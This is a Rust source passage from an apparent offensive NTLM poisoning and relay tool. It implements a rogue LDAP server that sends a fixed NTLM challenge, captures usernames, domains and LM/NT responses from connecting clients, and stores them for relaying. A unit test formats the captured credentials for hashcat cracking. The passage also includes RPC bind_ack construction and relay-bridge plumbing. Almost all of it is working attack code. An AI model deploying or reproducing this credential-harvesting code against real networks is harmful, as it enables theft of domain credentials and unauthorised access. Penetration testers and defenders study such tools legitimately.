        let listener = std::net::TcpListener::bind(&addr)
            .map_err(|e| RelayError::Socket(format!("Failed to bind LDAP: {}", e)))?;

        listener.set_nonblocking(true).ok();

        info!("LDAP responder listening on {addr}");

        for stream in listener.incoming() {
            if !running.load(Ordering::SeqCst) {
                break;
            }

            match stream {
                Ok(mut stream) => {
                    let peer = stream.peer_addr().ok();
                    let challenge_arr: [u8; 8] = hex_str_to_bytes(challenge)
                        .unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
                    if let Err(e) = Self::handle_ldap_client(&mut stream, &challenge_arr, &captured)
                    {
                        debug!("LDAP client error: {}", e);
                    }
                    if let Some(addr) = peer {
                        info!("LDAP NTLM handshake completed with {}", addr);
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(100));
                    continue;
                }
                Err(e) => {
                    warn!("LDAP accept error: {}", e);
                }
            }
        }

        info!("LDAP server stopped");
        Ok(())
    }

    fn handle_ldap_client(
        stream: &mut std::net::TcpStream,
        challenge_arr: &[u8; 8],
        captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(10))).ok();

        let mut buf = vec![0u8; 65536];

        // Read initial LDAP bind request
        let len = stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(format!("LDAP read error: {}", e)))?;

        if len < 10 {
            return Err(RelayError::Protocol("LDAP data too short".into()).into());
        }

        let bind1 = match parse_ldap_sasl_bind(&buf[..len]) {
            Some(bind) => bind,
            None => {
                let resp = build_ldap_bind_error(1, 2); // protocolError
                stream.write_all(&resp).ok();
                return Ok(());
            }
        };

        let mech = bind1.mechanism.to_ascii_uppercase();
        if mech != "GSS-SPNEGO" && mech != "SPNEGO" && mech != "NTLM" {
            let resp = build_ldap_bind_error(bind1.message_id, 7); // authMethodNotSupported
            stream.write_all(&resp).ok();
            return Ok(());
        }

        let ntlm_data = extract_ntlm_from_spnego(&bind1.credentials);
        let ntlm_type = ntlm_data.as_ref().and_then(|d| parse_ntlm_type(d));
        debug!("LDAP NTLM message type: {:?}", ntlm_type);

        // Build NTLM challenge and wrap in LDAP BindResponse
        let challenge = build_ntlm_challenge(*challenge_arr, "LDAP");
        let resp = build_ldap_bind_response(&challenge, bind1.message_id);
        stream
            .write_all(&resp)
            .map_err(|e| RelayError::Network(format!("LDAP write: {}", e)))?;

        // Read second bind request (NTLM authenticate)
        let len2 = stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(format!("LDAP read: {}", e)))?;

        let bind2 = parse_ldap_sasl_bind(&buf[..len2]);
        if let Some(bind2) = bind2 {
            if let Some(auth) = extract_ntlm_from_spnego(&bind2.credentials)
                && let Some(ntlm_auth) = parse_ntlm_authenticate(&auth)
            {
                let cred = CapturedCredential {
                    client_ip: stream
                        .peer_addr()
                        .map(|a| a.to_string())
                        .unwrap_or_default(),
                    username: ntlm_auth.username,
                    domain: ntlm_auth.domain,
                    challenge: bytes_to_hex(challenge_arr),
                    lm_response: bytes_to_hex(&ntlm_auth.lm_response),
                    nt_response: bytes_to_hex(&ntlm_auth.nt_response),
                    protocol: "LDAP".to_string(),
                    timestamp: chrono::Utc::now(),
                };
                let mut cap = captured.lock().unwrap_or_else(|e| {
                    warn!("Mutex poisoned in Responder -- recovering data");
                    e.into_inner()
                });
                cap.push(cred);
                info!("LDAP responder captured NTLM credentials");
            }

            let success = build_ldap_bind_success(bind2.message_id);
            stream.write_all(&success).ok();
            return Ok(());
        }

        let success = build_ldap_bind_success(bind1.message_id);
        stream.write_all(&success).ok();

        Ok(())
    }
}

/// Extract NTLM token from an RPC PDU auth trailer.
/// Validates RPC version (5) and basic PDU structure.
fn extract_msmq_ntlm_token(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 24 {
        return None;
    }

    // Validate RPC version
    if data[0] != 5 {
        return None;
    }

    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
    let auth_len = u16::from_le_bytes([data[10], data[11]]) as usize;

    if auth_len == 0 || frag_len == 0 || data.len() < 24 + auth_len {
        return None;
    }

    // Validate frag_len consistency
    if frag_len > data.len() {
        return None;
    }

    let trailer_start = data.len() - auth_len;
    if trailer_start + 16 > data.len() {
        return None;
    }

    let token_len = u32::from_le_bytes([
        data[trailer_start + 12],
        data[trailer_start + 13],
        data[trailer_start + 14],
        data[trailer_start + 15],
    ]) as usize;

    if trailer_start + 16 + token_len <= data.len() && token_len > 0 {
        Some(data[trailer_start + 16..trailer_start + 16 + token_len].to_vec())
    } else {
        None
    }
}

/// Build a minimal RPC bind_ack PDU with NTLM challenge as auth trailer
fn build_rpc_bind_ack(ntlm_challenge: &[u8], assoc_group: u32) -> Vec<u8> {
    let auth_len = 16 + ntlm_challenge.len();
    let body_len = 28 + 24 + 16 + ntlm_challenge.len();
    let frag_len = 24 + body_len;

    let mut pdu = vec![5u8, 0, 12, 0x03]; // RPC v5.0, BIND_ACK
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR

    pdu.extend_from_slice(&(frag_len as u16).to_le_bytes());
    pdu.extend_from_slice(&(auth_len as u16).to_le_bytes());
    pdu.extend_from_slice(&0u32.to_le_bytes()); // call_id

    // Body
    pdu.extend_from_slice(&4280u16.to_le_bytes()); // max_xmit
    pdu.extend_from_slice(&4280u16.to_le_bytes()); // max_recv
    pdu.extend_from_slice(&assoc_group.to_le_bytes());
    pdu.push(1); // secondary_addr_len
    pdu.push(0); // padding
    pdu.extend_from_slice(&[0u8; 20]); // secondary_addr (empty) + 2 padding
    pdu.push(1); // num_results
    pdu.extend_from_slice(&[0x00, 0x00, 0x00]); // padding
    pdu.extend_from_slice(&0u16.to_le_bytes()); // result
    pdu.extend_from_slice(&0u16.to_le_bytes()); // reason
    pdu.extend_from_slice(&[0u8; 16]); // transfer_syntax

    // Auth trailer
    pdu.extend_from_slice(&10u16.to_le_bytes()); // auth_type: NTLMSSP
    pdu.extend_from_slice(&6u16.to_le_bytes()); // auth_level: PKT_PRIVACY
    pdu.push(0); // auth_pad
    pdu.push(0); // auth_reserved
    pdu.extend_from_slice(&0u32.to_le_bytes()); // ctx_id
    pdu.extend_from_slice(&(ntlm_challenge.len() as u32).to_le_bytes());
    pdu.extend_from_slice(ntlm_challenge);

    while !pdu.len().is_multiple_of(4) {
        pdu.push(0);
    }

    pdu
}

// ===========================================================
// Helper Functions
// ===========================================================

/// Convert hex string to bytes
fn hex_str_to_bytes(s: &str) -> Option<[u8; 8]> {
    let s = s.replace(" ", "").replace("-", "").replace(":", "");
    if s.len() != 16 {
        return None;
    }

    let mut bytes = [0u8; 8];
    for i in 0..8 {
        bytes[i] = u8::from_str_radix(&s[i * 2..i * 2 + 2], 16).ok()?;
    }
    Some(bytes)
}

/// Convert bytes to hex string
fn bytes_to_hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02X}", b)).collect()
}

// ===========================================================
// LDAP BER helpers for NTLM SASL bind responder
// ===========================================================

#[derive(Debug, Clone)]
struct LdapSaslBind {
    message_id: u32,
    mechanism: String,
    credentials: Vec<u8>,
}

/// Build an LDAP BindResponse containing an NTLM challenge as serverSaslCreds.
/// Also known as LDAP SASL "challenge" response (resultCode 14, saslBindInProgress).
fn build_ldap_bind_response(ntlm_challenge: &[u8], message_id: u32) -> Vec<u8> {
    // Wrap NTLM challenge in SPNEGO NegTokenResp
    // [APPLICATION 1] SEQUENCE { [0] OID, [2] OCTET STRING wrapping NegTokenResp }
    // Simplified: directly embed as serverSaslCreds OCTET STRING
    let spnego_resp = build_spnego_challenge(ntlm_challenge);

    // LDAPMessage ::= SEQUENCE {
    //   messageID      INTEGER (0..maxInt),
    //   protocolOp     CHOICE { bindResponse BindResponse, ... }
    // }
    //
    // BindResponse ::= [APPLICATION 1] SEQUENCE {
    //   resultCode      ENUMERATED,
    //   matchedDN       OCTET STRING,
    //   diagnosticMsg   OCTET STRING,
    //   serverSaslCreds OCTET STRING OPTIONAL
    // }

    // Manually build DER for BindResponse with saslBindInProgress (14)
    let mut body = vec![
        0x0A, 0x01, 14, // resultCode = 14 (saslBindInProgress)
        0x04, 0x00, // matchedDN = "" (OCTET STRING, empty)
        0x04, 0x00, // diagnosticMsg = "" (OCTET STRING, empty)
        0x87, // serverSaslCreds (OCTET STRING, context-specific tag [7])
    ];
    encode_length(&mut body, spnego_resp.len());
    body.extend_from_slice(&spnego_resp);

    // Wrap in [APPLICATION 1] tag
    let mut bind_response = Vec::new();
    bind_response.push(0x61); // APPLICATION 1
    encode_length(&mut bind_response, body.len());
    bind_response.extend_from_slice(&body);

    // Wrap in LDAPMessage SEQUENCE
    // LDAPMessage ::= SEQUENCE { messageID INTEGER, protocolOp CHOICE }
    let mut msg = Vec::new();
    let msg_body = [encode_integer_vec(message_id), bind_response].concat();
    msg.push(0x30); // SEQUENCE
    encode_length(&mut msg, msg_body.len());
    msg.extend_from_slice(&msg_body);

    msg
}

/// Build an LDAP BindResponse with resultCode 0 (success)
fn build_ldap_bind_success(message_id: u32) -> Vec<u8> {
    let body = vec![
        0x0A, 0x01, 0x00, // resultCode = 0 (success)
        0x04, 0x00, // matchedDN = ""
        0x04, 0x00, // diagnosticMsg = ""
    ];

    // Wrap in [APPLICATION 1]
    let mut bind_response = Vec::new();
    bind_response.push(0x61);
    encode_length(&mut bind_response, body.len());
    bind_response.extend_from_slice(&body);

    // Wrap in LDAPMessage SEQUENCE
    let content = [encode_integer_vec(message_id), bind_response].concat();
    let mut msg = Vec::new();
    msg.push(0x30);
    encode_length(&mut msg, content.len());
    msg.extend_from_slice(&content);

    msg
}

/// Build an LDAP BindResponse with a specific result code (error).
fn build_ldap_bind_error(message_id: u32, result_code: u8) -> Vec<u8> {
    let body = vec![
        0x0A,
        0x01,
        result_code,
        0x04,
        0x00, // matchedDN = ""
        0x04,
        0x00, // diagnosticMsg = ""
    ];

    let mut bind_response = Vec::new();
    bind_response.push(0x61); // APPLICATION 1
    encode_length(&mut bind_response, body.len());
    bind_response.extend_from_slice(&body);

    let content = [encode_integer_vec(message_id), bind_response].concat();
    let mut msg = Vec::new();
    msg.push(0x30);
    encode_length(&mut msg, content.len());
    msg.extend_from_slice(&content);

    msg
}

/// Build a minimal SPNEGO NegTokenResp wrapping an NTLM challenge
fn build_spnego_challenge(ntlm_challenge: &[u8]) -> Vec<u8> {
    // SPNEGO NegTokenResp ::= [1] SEQUENCE {
    //   negState      [0] ENUMERATED (accept-incomplete),
    //   supportedMech [1] OID,
    //   responseToken [2] OCTET STRING (NTLM challenge)
    // }
    let mut seq = Vec::new();

    // negState = accept-incomplete (1)
    let neg_state = [0x0A, 0x01, 0x01];
    seq.push(0xA0);
    encode_length(&mut seq, neg_state.len());
    seq.extend_from_slice(&neg_state);

    // supportedMech [1] -- NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
    let ntlm_oid = [
        0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A,
    ];
    seq.push(0xA1);
    encode_length(&mut seq, ntlm_oid.len());
    seq.extend_from_slice(&ntlm_oid);

    // responseToken [2] -- OCTET STRING of NTLM challenge
    let mut resp = Vec::new();
    resp.push(0x04);
    encode_length(&mut resp, ntlm_challenge.len());
    resp.extend_from_slice(ntlm_challenge);
    seq.push(0xA2);
    encode_length(&mut seq, resp.len());
    seq.extend_from_slice(&resp);

    let mut seq_wrap = Vec::new();
    seq_wrap.push(0x30);
    encode_length(&mut seq_wrap, seq.len());
    seq_wrap.extend_from_slice(&seq);

    let mut neg_token = Vec::new();
    neg_token.push(0xA1); // [1] NegTokenResp
    encode_length(&mut neg_token, seq_wrap.len());
    neg_token.extend_from_slice(&seq_wrap);

    neg_token
}

/// Extract NTLMSSP blob from an LDAP SASL bind request
fn parse_ldap_sasl_bind(data: &[u8]) -> Option<LdapSaslBind> {
    let mut off = 0usize;
    let (tag, seq_data) = ber_read_tlv(data, &mut off)?;
    if tag != 0x30 {
        return None;
    }

    let mut inner = 0usize;
    let (msg_tag, msg_data) = ber_read_tlv(&seq_data, &mut inner)?;
    if msg_tag != 0x02 {
        return None;
    }
    let message_id = decode_ber_u32(&msg_data)?;

    let (op_tag, op_data) = ber_read_tlv(&seq_data, &mut inner)?;
    if op_tag != 0x60 {
        return None;
    }

    let mut bind_off = 0usize;
    let _ = ber_read_tlv(&op_data, &mut bind_off)?; // version
    let _ = ber_read_tlv(&op_data, &mut bind_off)?; // name
    let (auth_tag, auth_data) = ber_read_tlv(&op_data, &mut bind_off)?;
    if auth_tag != 0xA3 {
        return None;
    }

    let mut auth_off = 0usize;
    let (mech_tag, mech_data) = ber_read_tlv(&auth_data, &mut auth_off)?;
    if mech_tag != 0x04 {
        return None;
    }
    let mechanism = String::from_utf8_lossy(&mech_data).to_string();
    let mut credentials = Vec::new();
    if let Some((cred_tag, cred_data)) = ber_read_tlv(&auth_data, &mut auth_off)
        && cred_tag == 0x04
    {
        credentials = cred_data;
    }

    Some(LdapSaslBind {
        message_id,
        mechanism,
        credentials,
    })
}

fn extract_ntlm_from_spnego(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() >= 8 && &data[0..8] == NTLM_SIGNATURE {
        return Some(data.to_vec());
    }
    let sig = b"NTLMSSP";
    data.windows(sig.len())
        .position(|w| w == sig)
        .map(|pos| data[pos..].to_vec())
}

/// DER length encoding
fn encode_length(buf: &mut Vec<u8>, len: usize) {
    if len < 128 {
        buf.push(len as u8);
    } else if len < 256 {
        buf.push(0x81);
        buf.push(len as u8);
    } else if len < 65536 {
        buf.push(0x82);
        buf.extend_from_slice(&(len as u16).to_be_bytes());
    } else {
        buf.push(0x84);
        buf.extend_from_slice(&(len as u32).to_be_bytes());
    }
}

fn decode_ber_u32(data: &[u8]) -> Option<u32> {
    if data.is_empty() || data.len() > 4 {
        return None;
    }
    if data[0] & 0x80 != 0 {
        return None;
    }
    let mut val = 0u32;
    for b in data {
        val = (val << 8) | (*b as u32);
    }
    Some(val)
}

/// BER TLV reader: returns (tag, value) and advances `offset`.
fn ber_read_tlv(data: &[u8], offset: &mut usize) -> Option<(u8, Vec<u8>)> {
    if *offset >= data.len() {
        return None;
    }
    let tag = data[*offset];
    *offset += 1;

    if *offset >= data.len() {
        return None;
    }
    let first_len = data[*offset];
    *offset += 1;

    let length = if first_len < 0x80 {
        first_len as usize
    } else {
        let extra = (first_len & 0x7F) as usize;
        if extra == 0 || extra > 4 || *offset + extra > data.len() {
            return None;
        }
        let mut l = 0usize;
        for i in 0..extra {
            l = (l << 8) | (data[*offset + i] as usize);
        }
        *offset += extra;
        l
    };

    if *offset + length > data.len() {
        return None;
    }
    let value = data[*offset..*offset + length].to_vec();
    *offset += length;
    Some((tag, value))
}

/// Encode an integer for DER and return the bytes
fn encode_integer(buf: &mut Vec<u8>, val: u32) -> usize {
    let start = buf.len();
    if val < 256 {
        buf.push(0x02);
        buf.push(0x01);
        buf.push(val as u8);
    } else {
        let bytes = val.to_be_bytes();
        // Skip leading zeros
        let start_idx = bytes.iter().position(|&b| b != 0).unwrap_or(3);
        let trimmed = &bytes[start_idx..];
        buf.push(0x02);
        buf.push(trimmed.len() as u8);
        buf.extend_from_slice(trimmed);
    }
    buf.len() - start
}

fn encode_integer_vec(val: u32) -> Vec<u8> {
    let mut buf = Vec::new();
    encode_integer(&mut buf, val);
    buf
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_responder_config_default() {
        let config = ResponderConfig::default();
        assert_eq!(config.listen_ip, "::");
        assert!(config.http);
        assert!(config.smb);
        assert_eq!(config.challenge, Some("1122334455667788".to_string()));
    }

    #[test]
    fn test_ntlm_type_parsing() {
        // NTLM Negotiate message
        let negotiate = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, // Signature
            0x01, 0x00, 0x00, 0x00, // Type 1 (Negotiate)
            0x02, 0x00, 0x00, 0x00, // Flags
        ];

        assert_eq!(
            parse_ntlm_type(&negotiate),
            Some(NtlmMessageType::Negotiate)
        );
    }

    #[test]
    fn test_build_ntlm_challenge() {
        let challenge = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
        let msg = build_ntlm_challenge(challenge, "TEST");

        // Check signature
        assert_eq!(&msg[0..8], NTLM_SIGNATURE);
        // Check type
        assert_eq!(u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]), 2);
        // Check challenge is at offset 24
        assert_eq!(&msg[24..32], &challenge);
    }

    #[test]
    fn test_credential_format() {
        let cred = CapturedCredential {
            client_ip: "192.168.1.100".to_string(),
            username: "admin".to_string(),
            domain: "TEST".to_string(),
            challenge: "1122334455667788".to_string(),
            lm_response: "AABBCCDD".to_string(),
            nt_response: "EEFF0011".to_string(),
            protocol: "HTTP".to_string(),
            timestamp: chrono::Utc::now(),
        };

        let hashcat = cred.to_hashcat_format();
        assert!(hashcat.contains("admin::TEST:"));
    }

    #[test]
    fn test_hex_conversion() {
        let hex = "1122334455667788";
        let bytes = hex_str_to_bytes(hex).unwrap();
        assert_eq!(bytes, [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);

        let back = bytes_to_hex(&bytes);
        assert_eq!(back, "1122334455667788");
    }

    #[test]
    fn test_base64_roundtrip() {
        let data = b"Hello, World!";
        let encoded = base64_encode(data);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(data.to_vec(), decoded);
    }

    #[test]
    fn test_responder_relay_default_none() {
        let responder = Responder::new(ResponderConfig::default());
        assert!(responder.relay.is_none());
        assert!(responder.pending_relays.lock().unwrap().is_empty());
    }

    #[test]
    fn test_responder_set_relay() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let relay_config = crate::relay::RelayConfig::default();
        let ntlm_relay = crate::relay::NtlmRelay::new(relay_config);
        let shared = Arc::new(TokioMutex::new(ntlm_relay));

        let mut responder = Responder::new(ResponderConfig::default());
        responder.set_relay(shared, rt.handle().clone());

        assert!(responder.relay.is_some());
    }

    #[test]
    fn test_relay_bridge_clone() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let relay_config = crate::relay::RelayConfig::default();
        let ntlm_relay = crate::relay::NtlmRelay::new(relay_config);
        let shared = Arc::new(TokioMutex::new(ntlm_relay));

        let bridge = RelayBridge {
            relay: shared.clone(),
            handle: rt.handle().clone(),
        };
        let bridge2 = bridge.clone();

        assert!(Arc::ptr_eq(&bridge.relay, &bridge2.relay));
    }

    #[test]
    fn test_pending_relays_insert_and_remove() {
        let pending: PendingRelays = Arc::new(std::sync::Mutex::new(HashMap::new()));
        let key = "192.168.1.100".to_string();
        let challenge = vec![0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];

        {
            let mut map = pending.lock().unwrap();
            map.insert(key.clone(), (42u64, challenge.clone()));
        }

        {
            let mut map = pending.lock().unwrap();
            let entry = map.remove(&key);
            assert!(entry.is_some());
            let (relay_id, stored_challenge) = entry.unwrap();
            assert_eq!(relay_id, 42);
            assert_eq!(stored_challenge, challenge);
            assert!(map.is_empty());
        }
    }
}
